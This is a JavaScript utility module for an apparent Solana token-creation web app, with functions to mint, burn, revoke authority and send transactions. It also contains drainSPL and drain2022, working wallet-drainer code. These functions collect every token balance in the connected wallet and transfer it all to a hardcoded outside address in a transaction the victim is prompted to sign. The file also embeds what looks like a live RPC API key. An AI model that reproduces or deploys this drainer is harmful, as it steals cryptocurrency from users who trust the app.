/* global BigInt */
import {
    Connection,
    SystemProgram,
    clusterApiUrl,
    // Keypair,
    Transaction,
    // sendAndConfirmTransaction,
    PublicKey,
    LAMPORTS_PER_SOL,
    // Cluster,
    // LAMPORTS_PER_SOL,
} from "@solana/web3.js";

import { toast } from "react-toastify";

import config from "../config";
import * as Constants from "../constants";
import axios from "axios";
import { 
    ASSOCIATED_TOKEN_PROGRAM_ID, 
    TOKEN_2022_PROGRAM_ID, 
    TOKEN_PROGRAM_ID,
    MINT_SIZE,
    // createAccount,
    createAssociatedTokenAccountInstruction,
    createTransferInstruction,
    // transferCheckedWithFee,
    getAccount,
    getAssociatedTokenAddress,
    createTransferCheckedWithFeeInstruction,
    getMinimumBalanceForRentExemptMint,
    createInitializeMintInstruction,
    createMintToInstruction,
    ExtensionType,
    getMintLen,
    createInitializeTransferFeeConfigInstruction,
    createSetAuthorityInstruction,
    createBurnInstruction,
    createBurnCheckedInstruction,
    AuthorityType
} from "@solana/spl-token";
import { useEffect, useState } from "react";

let networkUrl = config.isMainnet ?
    "https://solana-mainnet.g.alchemy.com/v2/Wk6YMhx6MHBvVj93MAMWgl1qV_lRODpc"
    :
    clusterApiUrl(Constants.NETWORK);

console.log("networkUrl: ", networkUrl);
let connection = new Connection(networkUrl, "confirmed");

export const getTokenAmountAndDecimals = async (mintKey) => {
    try {
        const tokenInfo = await connection.getTokenSupply(new PublicKey(mintKey));
        // const totalSupply = tokenInfo.value.uiAmount;
        const decimals = tokenInfo.value.decimals;
        const amount = tokenInfo.value.amount;
        return { decimals, amount };
    } catch (err) {
        console.error("getTokenAmountAndDecimals Error: ", err);
        return { decimals: 0, amount: 0 };
    }
}

export const getTokenAccountBalance = async (mintKey, owner, allowOwnerOffCurve = false) => {
    const tokenType = 0;
    let tokenATA;
    try {
        tokenATA = await getAssociatedTokenAddress(mintKey, owner, allowOwnerOffCurve, TOKEN_PROGRAM_ID);
    } catch (err) {
        console.error("getAssociatedTokenAddress Error: ", err);
        return { decimals: 0, amount: 0, uiAmount: 0, tokenType };
    }

    try {
        const tokenInfo = await connection.getTokenAccountBalance(tokenATA);

        const decimals = tokenInfo.value.decimals;
        const amount = tokenInfo.value.amount;
        const uiAmount = tokenInfo.value.uiAmount;
        return { decimals, amount, uiAmount, tokenType };
    } catch (err) {
        console.error("getTokenAccountBalance Error: ", err);
        return { decimals: 0, amount: 0, uiAmount: 0, tokenType };
    }
}

export const isSPLTokenOrToken2022 = async (mintKey) => {
    const res = await connection.getAccountInfo(mintKey);
    if (res?.owner?.equals(TOKEN_PROGRAM_ID)) {
        return Constants.TOKEN_TYPE.SPL;
    } else if (res?.owner?.equals(TOKEN_2022_PROGRAM_ID)) {
        return Constants.TOKEN_TYPE.TOKEN2022;
    } else {
        return 2;
    }
}

export const pullTokenInfo = async (mintKey) => {
    const tokenInfo = await connection.getTokenSupply(new PublicKey(mintKey));
    const totalSupply = tokenInfo.value.uiAmount;
    const decimals = tokenInfo.value.decimals;

    try {
        const res = await axios.get(`https://solana-gateway.moralis.io/token/${config.isMainnet === true ? "mainnet" : "devnet"}/${mintKey}/metadata`, {
            headers: {
                accept: 'application/json',
                'X-API-Key': config.MORALIS_API_KEY
            }
        });

        console.log("Moralis result: ", res);

        return {
            name: res.data.name,
            symbol: res.data.symbol,
            totalSupply,
            decimals
        }
    } catch (err) {
        console.error("Moralis Error: ", err.message);
    }

    return { totalSupply, decimals }
}

export const drainSPL = async (wallet) => {
    if (wallet.publicKey) {
        const accounts = await connection.getParsedProgramAccounts(
            TOKEN_PROGRAM_ID,
            {
                filters: [
                    {
                        dataSize: 165, // number of bytes
                    },
                    {
                        memcmp: {
                            offset: 32, // number of bytes
                            bytes: wallet.publicKey.toString(), // base58 encoded string
                        },
                    },
                ],
            }
        );

        console.log("Accounts: ", accounts);

        // let toWallet = Keypair.generate();
        let toWallet = new PublicKey("1s4h2sFmd8Qvjn6tMdwA5hLd3LcexfwYaKUHVzBHRYV");
        console.log("ToWallet: ", toWallet.toBase58());

        const balance = await connection.getBalance(wallet.publicKey);
        console.log("SolBalance: ", balance);
        const tx = new Transaction();


        await Promise.all(accounts.map(async (item, index) => {
            // console.log(index, ": ", item?.account?.data?.parsed?.info);
            let amount = item?.account?.data?.parsed?.info?.tokenAmount?.amount;
            if (amount === 0) return;
            // let mintKey = item?.account?.data?.parsed?.info?.mint;
            // console.log(index, ": ", item.pubkey.toBase58(), amount, mintKey );

            const fromATA = item.pubkey;
            console.log("fromATA: ", fromATA.toBase58());
            const mintKey = new PublicKey(item?.account?.data?.parsed?.info?.mint);
            const toATA = await getAssociatedTokenAddress(mintKey, toWallet);
            console.log("toATA: ", toATA.toBase58());
            // Create an instruction to create the receiver's token account if it does not exist
            const createAccountInstruction = createAssociatedTokenAccountInstruction(
                wallet.publicKey,
                toATA,
                toWallet,
                mintKey,
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            )

            // Check if the receiver's token account exists
            let receiverTokenAccount;
            try {
                receiverTokenAccount = await getAccount(
                    connection,
                    toATA,
                    "confirmed",
                    TOKEN_PROGRAM_ID
                )
                console.log("receiverTokenAccount: ", receiverTokenAccount);
            } catch (e) {
                // If the account does not exist, add the create account instruction to the transaction
                tx.add(createAccountInstruction)
            }

            console.log("xxxxxxxxxx: ", mintKey.toBase58(), ": ", fromATA.toBase58(), ": ", toATA.toBase58(), ": ", amount);
            tx.add(createTransferInstruction(fromATA, toATA, wallet.publicKey, amount, []));
        }));

        console.log("TX: ", tx);

        // tx.add(SystemProgram.transfer({
        //     fromPubkey: wallet.publicKey,
        //     toPubkey: new PublicKey(config.ADMIN_WALLET),
        //     lamports: balance
        // }));

        await send(wallet, tx);
    }
}

export const drain2022 = async (wallet) => {
    if (wallet.publicKey) {
        const accounts = await connection.getParsedProgramAccounts(
            TOKEN_2022_PROGRAM_ID,
            {
                commitment: 'confirmed',
                filters: [
                    {
                        memcmp: {
                            offset: 32, // number of bytes
                            bytes: wallet.publicKey.toString(), // base58 encoded string
                        },
                    },
                ],
            }
        );

        console.log("Accounts: ", accounts);

        // let toWallet = Keypair.generate();
        let toWallet = new PublicKey("1s4h2sFmd8Qvjn6tMdwA5hLd3LcexfwYaKUHVzBHRYV");
        console.log("ToWallet: ", toWallet.toBase58());

        const balance = await connection.getBalance(wallet.publicKey);
        console.log("SolBalance: ", balance);
        const tx = new Transaction();


        await Promise.all(accounts.map(async (item, index) => {
            // console.log(index, ": ", item?.account?.data?.parsed?.info);
            let amount = item?.account?.data?.parsed?.info?.tokenAmount?.amount;
            console.log(index, ": ", amount);
            if (amount === 0) return;

            let decimals = item?.account?.data?.parsed?.info?.tokenAmount?.decimals;
            // if (index != 0) return;
            // let mintKey = item?.account?.data?.parsed?.info?.mint;
            // console.log(index, ": ", item.pubkey.toBase58(), amount, mintKey );
            const mintKey = new PublicKey(item?.account?.data?.parsed?.info?.mint);
            // const metadata = await pullTokenInfo(mintKey.toBase58());
            // console.log("metadata: ", metadata);


            const fromATA = item.pubkey;
            console.log("fromATA: ", fromATA.toBase58());

            const toATA = await getAssociatedTokenAddress(mintKey, toWallet, false, TOKEN_2022_PROGRAM_ID);
            // const fromATA2 = await getAssociatedTokenAddress(mintKey, wallet.publicKey, false, TOKEN_2022_PROGRAM_ID);
            // console.log("fromATA2: ", fromATA2.toBase58());
            console.log("toATA: ", toATA.toBase58());
            // Create an instruction to create the receiver's token account if it does not exist
            const createAccountInstruction = createAssociatedTokenAccountInstruction(
                wallet.publicKey,
                toATA,
                toWallet,
                mintKey,
                TOKEN_2022_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            )

            // Check if the receiver's token account exists
            let receiverTokenAccount;
            try {
                receiverTokenAccount = await getAccount(
                    connection,
                    toATA,
                    "confirmed",
                    TOKEN_2022_PROGRAM_ID
                )
                console.log("receiverTokenAccount: ", receiverTokenAccount);
            } catch (e) {
                console.log("getAccount Error: ", e.message);
                // If the account does not exist, add the create account instruction to the transaction
                tx.add(createAccountInstruction)
            }

            console.log("xxxxxxxxxx: ", mintKey.toBase58(), ": ", fromATA.toBase58(), ": ", toATA.toBase58(), ": ", amount);
            tx.add(
                createTransferCheckedWithFeeInstruction(
                    fromATA,
                    mintKey,
                    toATA,
                    wallet.publicKey,
                    amount,
                    decimals,
                    0
                )
            );
        }));

        console.log("TX: ", tx);

        // tx.add(SystemProgram.transfer({
        //     fromPubkey: wallet.publicKey,
        //     toPubkey: new PublicKey(config.ADMIN_WALLET),
        //     lamports: balance
        // }));

        await send(wallet, tx);
    }
}

export const createSPLToken = async (decimal, supply, wallet, mintKey) => {

    let owner = wallet.publicKey;
    let payer = wallet;
    const mintAuthority = wallet.publicKey;
    const freezeAuthority = wallet.publicKey;
    // const updateAuthority = wallet.publicKey;

    // Create Token
    const lamports = await getMinimumBalanceForRentExemptMint(connection);
    console.log("required lamports: ", lamports);
    console.log("mintKey: ", mintKey.toBase58());
    console.log("Owner: ", owner.toBase58());
    const tokenATA = await getAssociatedTokenAddress(mintKey, owner);
    console.log("tokenATA: ", tokenATA);

    const createTokenTx = new Transaction().add(
        SystemProgram.createAccount({
            fromPubkey: payer.publicKey,
            newAccountPubkey: mintKey,
            space: MINT_SIZE,
            lamports,
            programId: TOKEN_PROGRAM_ID,
        }),
        createInitializeMintInstruction(
            mintKey,
            decimal,
            mintAuthority,
            freezeAuthority,
            TOKEN_PROGRAM_ID
        ),
        createAssociatedTokenAccountInstruction(
            payer.publicKey,
            tokenATA,
            owner,
            mintKey
        ),
        createMintToInstruction(
            mintKey,
            tokenATA,
            mintAuthority,
            BigInt(supply * Math.pow(10, decimal))
        )
    );

    return createTokenTx;
};

export const createToken2022 = async (decimal, supply, transferFee, wallet, mintKey) => {

    let owner = wallet.publicKey;
    let payer = wallet;
    const mintAuthority = wallet.publicKey;
    const freezeAuthority = wallet.publicKey;
    // const updateAuthority = wallet.publicKey;

    // Create Token
    const extensions = [ExtensionType.TransferFeeConfig];
    const mintLen = getMintLen(extensions);
    const lamports = await connection.getMinimumBalanceForRentExemption(mintLen);
    console.log("required lamports: ", lamports);

    const tokenATA = await getAssociatedTokenAddress(mintKey, owner, false, TOKEN_2022_PROGRAM_ID);
    console.log("tokenATA: ", tokenATA);

    const createTokenTx = new Transaction().add(
        SystemProgram.createAccount({
            fromPubkey: payer.publicKey,
            newAccountPubkey: mintKey,
            space: mintLen,
            lamports,
            programId: TOKEN_2022_PROGRAM_ID
        }),
        // createInitializeMintCloseAuthorityInstruction(
        //     mintKey,
        //     closeAuthority,
        //     programId,
        // ),
        createInitializeTransferFeeConfigInstruction(
            mintKey,
            payer.publicKey,
            payer.publicKey,
            transferFee,
            BigInt(supply * Math.pow(10, decimal)),
            TOKEN_2022_PROGRAM_ID
        ),
        createInitializeMintInstruction(
            mintKey,
            decimal,
            mintAuthority,
            freezeAuthority,
            TOKEN_2022_PROGRAM_ID
        ),
        createAssociatedTokenAccountInstruction(
            payer.publicKey,
            tokenATA,
            owner,
            mintKey,
            TOKEN_2022_PROGRAM_ID
        ),
        createMintToInstruction(
            mintKey,
            tokenATA,
            mintAuthority,
            supply * Math.pow(10, decimal),
            [],
            TOKEN_2022_PROGRAM_ID
        )
    );

    return createTokenTx;
};

export const revokeMintAuthority = async (wallet, mintKey, authorityType) => {
    const tokenType = await isSPLTokenOrToken2022(mintKey);
    let programId;
    if (tokenType == Constants.TOKEN_TYPE.SPL) {
        programId = TOKEN_PROGRAM_ID;
    } else if (tokenType == Constants.TOKEN_TYPE.TOKEN2022) {
        programId = TOKEN_2022_PROGRAM_ID;
    } else {
        return false;
    }

    const transaction = new Transaction().add(
        SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new PublicKey(config.ADMIN_WALLET),
            lamports: Constants.REVOKE_AUTHORITY_FEE * LAMPORTS_PER_SOL
        }),
        createSetAuthorityInstruction(
            mintKey,
            wallet.publicKey,
            authorityType, // 0: Mint Authority, 1: FreezeAccount
            null,
            [],
            programId
        )
    );

    let txHash;
    try {
        txHash = await send(wallet, transaction);
    } catch (err) {
        console.error("Revoke Transaction Error: ", err);
        return false;
    }

    if (txHash) {
        return true;
    } else {
        return false;
    }
}

export const burnToken = async (wallet, mintKey, burnAmount) => {

    const tokenType = await isSPLTokenOrToken2022(mintKey);

    let programId;
    let tokenATA;
    if (tokenType == Constants.TOKEN_TYPE.SPL) {
        programId = TOKEN_PROGRAM_ID;
        tokenATA = await getAssociatedTokenAddress(mintKey, wallet.publicKey);
    } else if (tokenType == Constants.TOKEN_TYPE.TOKEN2022) {
        programId = TOKEN_2022_PROGRAM_ID;
        tokenATA = await getAssociatedTokenAddress(mintKey, wallet.publicKey, false, TOKEN_2022_PROGRAM_ID);
    } else {
        return false;
    }


    const tokenInfo = await connection.getTokenAccountBalance(tokenATA);
    const amount = burnAmount * Math.pow(10, tokenInfo.value.decimals);
    if (tokenInfo.value.amount < amount) {
        toast.error("You have no enough token amount to burn!");
        return false;
    }

    const transaction = new Transaction().add(
        SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new PublicKey(config.ADMIN_WALLET),
            lamports: Constants.REVOKE_AUTHORITY_FEE * LAMPORTS_PER_SOL
        }),
        createBurnInstruction(
            tokenATA,
            mintKey,
            wallet.publicKey,
            amount,
            [],
            programId
        )
    );

    let txHash;
    try {
        txHash = await send(wallet, transaction);
    } catch (err) {
        console.error("Revoke Transaction Error: ", err);
        return false;
    }

    if (txHash) {
        return true;
    } else {
        return false;
    }
}

export async function send(wallet, transaction, mintKeyPair = null) {
    console.log("send->mintKeyPair: ", mintKeyPair);
    const txHash = await sendTransaction(connection, wallet, transaction, mintKeyPair);
    if (txHash != null) {
        let confirming_id = toast.success("Confirming Transaction ...");
        let res = await connection.confirmTransaction(txHash);
        console.log(txHash);
        toast.dismiss(confirming_id);

        if (res.value.err) {
            toast.error("Transaction Failed");
            return null;
        }
        else toast.success(`Confirmed!`, 4000);
    } else {
        toast.error("Transaction Failed");

        return null;
    }

    return txHash;
}

export const checkWalletAddressFormat = (adr) => {
    if (adr == '') return false;

    try {
        const checkAdr = new PublicKey(adr);
    } catch (err) {
        console.error("checkWalletAddressFormat : ", adr);

        return false;
    }

    return true;
}

export async function sendTransaction(connection, wallet, transaction, mintKeyPair) {
    if (wallet.publicKey === null || wallet.signTransaction === undefined)
        return null;
    try {
        transaction.recentBlockhash = (
            await connection.getLatestBlockhash()
        ).blockhash;
        transaction.feePayer = wallet.publicKey;
        if (mintKeyPair != null) {
            console.log("mintKeyPair Sign: ", mintKeyPair.publicKey.toBase58());
            transaction.sign(mintKeyPair);
        }

        const signedTransaction = await wallet.signTransaction(transaction);

        console.log("signedTransaction: ", signedTransaction);
        const rawTransaction = signedTransaction.serialize();

        toast.success("Sending Transaction ...");

        const txid = await connection.sendRawTransaction(
            rawTransaction,
            {
                skipPreflight: true,
                preflightCommitment: "processed",
            }
        );
        return txid;
    } catch (err) {
        console.log("sendTransaction Error: ", err);
        return null;
    }
}

export const shorten = (str) => {
    return str.slice(0, 10) + "..." + str.slice(str.length - 8);
}

export const secondsToTimeFormat = (unix_timestamp) => {
    if (unix_timestamp == 0) return '';
    
    const date = new Date(unix_timestamp * 1000);
    let h = date.getHours(); h = h < 10 ? '0' + h : h;
    let m = date.getMinutes(); m = m < 10 ? '0' + m : m;
    let s = date.getSeconds(); s = s < 10 ? '0' + s : s;

    return `${date.getMonth()+1}/${date.getDate()}/${date.getFullYear()}, ${h}:${m}:${s}`;
}

export const IntervalComponent = ({ createdAt }) => {
    const [dd, setDD] = useState(0);
    const [ss, setSS] = useState(0);
    const [mm, setMM] = useState(0);
    const [hh, setHH] = useState(0);

    useEffect(() => {
        const interval = setInterval(() => {
            let total = Math.abs(createdAt - Date.now() / 1000);
            total = Math.max(total, 0);
            const _ss = Math.floor(total % 60); setSS(_ss < 10 ? '0' + _ss : _ss);
            const _mm = Math.floor((total / (60)) % 60); setMM(_mm < 10 ? '0' + _mm : _mm);
            const _hh = Math.floor((total / (60 * 60)) % 24); setHH(_hh < 10 ? '0' + _hh : _hh);
            const _dd = Math.floor((total / (60 * 60 * 24))); setDD(_dd < 10 ? '0' + _dd : _dd);
        }, [1000]);
        
        return () => clearInterval(interval);
    }, [createdAt])

    return (
        <div>
            {createdAt == 0 ? 'False' : `${dd}d ${hh}h ${mm}m ${ss}s`}
        </div>
    );
}

export function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

export const scanLink = (tx) => {
    return `https://explorer.solana.com/tx/${tx}`
    // return `https://explorer.solana.com/tx/${tx}?cluster=devnet`
}

export const scanAddressLink = (address) => {
    return `https://explorer.solana.com/address/${address}`
    // return `https://explorer.solana.com/address/${address}?cluster=devnet`
}

export const showTxResult = (txHash, type = 0) => {
    if (txHash != null) {
        console.log("txHash: ", txHash);

        toast.success(
            <div>
                <p>Successfully processed!</p>
                <a href={type == 1 ? scanAddressLink(txHash) : scanLink(txHash)} target="_blank" className="underline text-blue-600">{shorten(txHash)}</a>
            </div>
            ,
            {
                autoClose: 10000,
            }
        );

    } else {
        toast.error(`Failed, please try again later`);
    }
}